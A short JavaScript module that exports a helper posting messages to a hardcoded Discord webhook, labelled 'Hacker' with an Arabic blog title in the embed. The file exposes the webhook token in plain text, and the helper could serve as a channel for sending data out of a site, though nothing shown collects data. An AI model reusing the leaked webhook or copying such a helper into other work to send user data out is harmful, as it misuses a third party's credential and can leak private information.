import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة زاجل ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330698465449087017/hMUv_cRrd-NgmDOlfG9RDPnbPiyJbht-ILDD4X8P7r4lCmoe6gouRBvQm2KKG9Hbo9r1",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
